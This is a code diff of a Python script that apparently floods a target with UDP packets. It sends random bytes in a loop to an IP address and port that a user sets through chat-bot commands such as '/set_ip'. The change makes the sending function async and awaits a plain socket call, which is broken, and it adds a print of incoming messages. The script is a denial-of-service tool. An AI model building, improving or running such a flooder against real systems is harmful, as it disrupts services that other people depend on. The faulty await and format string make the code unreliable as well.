@@ -27,14 +27,14 @@ def infoBox(msg):
 def errorBox(msg):
     return "{}[{}{}{}] [{}{}{}] {}".format(f.RESET, f.RED, "ERROR", f.RESET, f.YELLOW, time.strftime("%H:%%M:%S"), f.RESET, msg)
 
-def start(ip, port, for_):
+async def start(ip, port, for_):
     num = 0
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 #        num += 1
 
         for i in range(for_):
-            sock.sendto(randomBytes(), (ip, port))
+            await sock.sendto(randomBytes(), (ip, port))
             num += 1
     except Exception as e:
         return e
@@ -54,6 +54,8 @@ data : dict = {}
 async def main(msg):
 
     text = str(msg.text)
+
+    print(text)
 
     if text.startswith("/set_ip"):
         ip = text.replace("/set_ip ", "")
